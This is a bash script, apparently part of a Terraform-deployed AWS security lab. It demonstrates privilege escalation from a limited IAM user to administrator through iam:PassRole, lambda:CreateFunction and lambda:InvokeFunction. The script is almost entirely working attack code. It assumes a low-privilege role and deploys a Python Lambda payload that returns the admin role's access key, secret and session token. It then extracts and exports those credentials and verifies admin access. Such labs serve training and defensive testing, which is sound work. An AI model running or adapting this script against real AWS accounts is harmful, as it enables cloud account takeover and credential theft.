#!/bin/bash

# Demo script for iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction privilege escalation
# This script demonstrates how a role with PassRole, CreateFunction, and InvokeFunction can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-one-hop-plcflif-starting-user"
PRIVESC_ROLE="pl-prod-one-hop-plcflif-role"
ADMIN_ROLE="pl-prod-one-hop-plcflif-admin-role"
LAMBDA_FUNCTION_NAME="pl-plcflif-credential-extractor"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + InvokeFunction Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_lambda.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Assume the privilege escalation role
echo -e "${YELLOW}Step 4: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 5: Check current permissions (should be limited)
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 6: Prepare Lambda function payload
echo -e "${YELLOW}Step 6: Preparing Lambda function to extract admin credentials${NC}"
echo "Creating Python function that will extract credentials from the admin role..."

# Create Lambda function code
cat > /tmp/lambda_function.py << 'EOF'
import json
import os

def lambda_handler(event, context):
    """
    Extract AWS credentials from the Lambda execution environment.
    When this function is executed with an admin role, it will have admin credentials.
    """
    return {
        'statusCode': 200,
        'body': json.dumps({
            'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),
            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
            'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN'),
            'message': 'Successfully retrieved admin credentials!'
        })
    }
EOF

# Create a zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"

# Step 7: Create Lambda function with admin role
echo -e "${YELLOW}Step 7: Creating Lambda function with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role to Lambda..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

LAMBDA_RESULT=$(aws lambda create-function \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --runtime "python3.11" \
    --role "$ADMIN_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb:///tmp/lambda_function.zip" \
    --timeout 30 \
    --output json)

if [ $? -eq 0 ]; then
    FUNCTION_ARN=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionArn')
    echo "Function ARN: $FUNCTION_ARN"
    echo -e "${GREEN}✓ Successfully created Lambda function with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 8: Wait for Lambda function to be ready
echo -e "${YELLOW}Step 8: Waiting for Lambda function to be ready${NC}"
echo "Allowing time for Lambda function initialization..."
sleep 10
echo -e "${GREEN}✓ Lambda function ready${NC}\n"

# Step 9: Invoke the Lambda function to extract credentials
echo -e "${YELLOW}Step 9: Invoking Lambda function to extract admin credentials${NC}"
echo "Invoking function: $LAMBDA_FUNCTION_NAME"

aws lambda invoke \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --payload '{}' \
    /tmp/response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Response from Lambda function:"
    cat /tmp/response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
    exit 1
fi

# Step 10: Extract and parse admin credentials from response
echo -e "${YELLOW}Step 10: Extracting admin credentials from Lambda response${NC}"

# Parse the nested JSON response
RESPONSE_BODY=$(cat /tmp/response.json | jq -r '.body' 2>/dev/null)

if [ -z "$RESPONSE_BODY" ] || [ "$RESPONSE_BODY" = "null" ]; then
    echo -e "${RED}Error: Could not extract response body from Lambda${NC}"
    echo "Raw response:"
    cat /tmp/response.json
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
    exit 1
fi

# Parse the body which is also JSON
ADMIN_ACCESS_KEY=$(echo "$RESPONSE_BODY" | jq -r '.AWS_ACCESS_KEY_ID' 2>/dev/null)
ADMIN_SECRET_KEY=$(echo "$RESPONSE_BODY" | jq -r '.AWS_SECRET_ACCESS_KEY' 2>/dev/null)
ADMIN_SESSION_TOKEN=$(echo "$RESPONSE_BODY" | jq -r '.AWS_SESSION_TOKEN' 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Could not extract admin credentials from response${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
    exit 1
fi

echo "Extracted credentials:"
echo "Access Key ID: ${ADMIN_ACCESS_KEY:0:20}..."
echo "Secret Access Key: ${ADMIN_SECRET_KEY:0:20}..."
echo "Session Token: ${ADMIN_SESSION_TOKEN:0:20}..."
echo -e "${GREEN}✓ Successfully extracted admin credentials${NC}\n"

# Step 11: Switch to admin credentials
echo -e "${YELLOW}Step 11: Switching to admin credentials${NC}"
export AWS_ACCESS_KEY_ID=$ADMIN_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$ADMIN_SECRET_KEY
export AWS_SESSION_TOKEN=$ADMIN_SESSION_TOKEN
# Keep region consistent
export AWS_REGION=$AWS_REGION

ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"
echo -e "${GREEN}✓ Successfully switched to admin credentials${NC}\n"

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
    exit 1
fi
echo ""

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Assumed role: $PRIVESC_ROLE (with iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction)"
echo "3. Created Lambda function with admin role attached"
echo "4. Invoked Lambda function to extract admin credentials"
echo "5. Used extracted credentials to assume admin role"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE"
echo -e "  → (PassRole + CreateFunction) → Lambda with $ADMIN_ROLE"
echo -e "  → (InvokeFunction) → Extract Credentials → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
echo "- Function Role: $ADMIN_ROLE"

echo -e "\n${RED}⚠ Warning: The Lambda function is still deployed${NC}"
echo -e "${RED}⚠ Lambda functions incur charges when invoked${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
